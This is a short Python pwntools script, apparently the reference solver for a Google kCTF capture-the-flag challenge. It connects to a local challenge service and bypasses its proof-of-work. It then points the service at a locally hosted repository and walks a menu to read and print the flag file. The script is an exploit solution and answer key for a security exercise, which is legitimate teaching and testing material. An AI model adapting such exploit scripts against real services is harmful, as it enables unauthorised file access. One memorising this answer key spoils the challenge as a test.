#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
r.recvuntil('== proof-of-work: ')
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.recvuntil(b'>>> Repo url: ')
r.sendline(b'http://localhost:45281/SlzkhRAEM8eS4r0cWn/')

r.recvuntil(b'>>> ')
r.sendline(b'1')
r.recvuntil(b'Subdirectory to enter: ')
r.sendline(b'subdir')
r.recvuntil(b'Subdirectory to enter: ')
r.sendline(b'')
r.recvuntil(b'>>> ')
r.sendline(b'3')
r.recvuntil(b'>>> ')
r.sendline(b'2')
r.recvuntil(b'to display: ')
r.sendline(b'flag')
res = r.recvuntil(b'CTF{')
res += r.recvuntil(b'}')
print(res)

exit(0)
